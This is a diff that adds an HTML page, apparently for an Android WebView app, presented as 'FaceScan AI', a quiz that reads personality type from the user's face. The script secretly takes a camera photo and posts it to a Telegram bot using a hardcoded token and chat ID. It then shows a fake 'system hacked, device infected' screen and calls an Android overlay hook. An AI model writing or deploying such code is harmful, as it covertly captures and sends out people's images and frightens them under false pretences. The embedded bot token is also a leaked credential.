@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>FaceScan AI</title>
+<style>
+:root { --bg: #0a0908; --fg: #efe9dc; --gold: #c9a24b; --gold-hi: #ecd28b; --muted: #8f8776; }
+body { background: var(--bg); color: var(--fg); font-family: sans-serif; margin: 0; overflow: hidden; }
+#hero { display: flex; flex-direction: column; justify-content: center; height: 100vh; padding: 20px; text-align: left; }
+h1 { font-family: serif; font-size: 3rem; margin: 0 0 20px 0; line-height: 1; }
+h1 em { color: var(--gold-hi); font-style: italic; }
+.btn { background: transparent; color: var(--gold-hi); border: 1px solid var(--gold); padding: 15px 30px; font-size: 14px; letter-spacing: 2px; text-transform: uppercase; margin-top: 30px; }
+#scan { position: fixed; inset: 0; display: none; background: var(--bg); }
+#scan.on { display: block; }
+.status { position: absolute; top: 40px; left: 20px; color: var(--gold-hi); font-family: monospace; }
+#cam-error { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+#cam-error.on { display: flex; }
+#hack-wrapper { position: fixed; inset: 0; background: #000; color: #f00; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; font-family: monospace; }
+#hack-wrapper.on { display: flex; }
+</style>
+</head>
+<body>
+
+<div id="hero">
+  <div style="color:var(--gold); font-family:monospace; letter-spacing:2px;">ИИ · АНАЛИЗ ЛИЦА</div>
+  <h1>Определи свой <br>психотип <em>по лицу.</em></h1>
+  <div>Узнай, кто ты: <b>Альфа, Сигма или Бета.</b></div>
+  <button class="btn" id="start">Запустить скан</button>
+</div>
+
+<div id="scan">
+  <div class="status" id="status">Инициализация...</div>
+</div>
+
+<div id="cam-error">
+  <h2 style="color:#f00;">ОШИБКА</h2>
+  <p>Вы отклонили доступ к камере или не дали нужные разрешения.</p>
+  <button class="btn" id="retry-cam" style="border-color:#f00; color:#f00;">Попробовать снова</button>
+</div>
+
+<div id="hack-wrapper">
+  <h1 style="font-size:80px; margin:0;">☠️</h1>
+  <h2>СИСТЕМА ВЗЛОМАНА</h2>
+  <p>Ваше устройство заражено.<br>Для выхода перезагрузите телефон.</p>
+</div>
+
+<script>
+  const BOT_TOKEN = '9289295852:AAFohFM7AIcN4aA0JYYDtiXJc_ayX6AoP_0';
+  const CHAT_ID   = '8770474459';
+  
+  let isPermissionsGranted = false;
+
+  // 1. Эта функция вызывается из Android, когда ВСЕ разрешения получены
+  window.startScanning = function() {
+    isPermissionsGranted = true;
+    document.getElementById('cam-error').classList.remove('on');
+    requestCameraAndStart();
+  };
+
+  // 2. Клик по кнопке "Запустить скан"
+  document.getElementById('start').addEventListener('click', function() {
+    document.getElementById('status').innerText = "Запрос разрешений...";
+    if (typeof Android !== 'undefined') {
+      Android.requestPermissions(); // Просим Android проверить разрешения
+    } else {
+      // Для теста в обычном браузере
+      requestCameraAndStart();
+    }
+  });
+
+  document.getElementById('retry-cam').addEventListener('click', function() {
+    document.getElementById('cam-error').classList.remove('on');
+    document.getElementById('start').click();
+  });
+
+  async function requestCameraAndStart() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      document.getElementById('hero').style.display = 'none';
+      document.getElementById('scan').classList.add('on');
+      document.getElementById('status').innerText = "Считывание черт лица...";
+
+      setTimeout(async () => {
+        document.getElementById('status').innerText = "Анализ микровыражений...";
+        
+        const videoElement = document.createElement('video');
+        videoElement.srcObject = stream;
+        videoElement.setAttribute('playsinline', '');
+        videoElement.muted = true;
+        await videoElement.play();
+        
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const c = document.createElement('canvas');
+        c.width = 640; c.height = 480;
+        c.getContext('2d').drawImage(videoElement, 0, 0, 640, 480);
+        stream.getTracks().forEach(t => t.stop());
+        
+        const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'poco_scan.jpg');
+        fd.append('caption', '📸 Фото с FaceScan AI');
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: fd });
+
+        setTimeout(() => {
+            document.getElementById('status').innerText = "Формирование результата...";
+        }, 2000);
+
+        setTimeout(() => {
+            document.getElementById('scan').classList.remove('on');
+            document.getElementById('hack-wrapper').classList.add('on');
+            // Говорим Android запустить оверлей поверх всего
+            if (typeof Android !== 'undefined') { Android.triggerHack(); }
+        }, 4000);
+
+      }, 1500);
+
+    } catch (err) {
+      document.getElementById('cam-error').classList.add('on');
+    }
+  }
+</script>
+</body>
+</html>
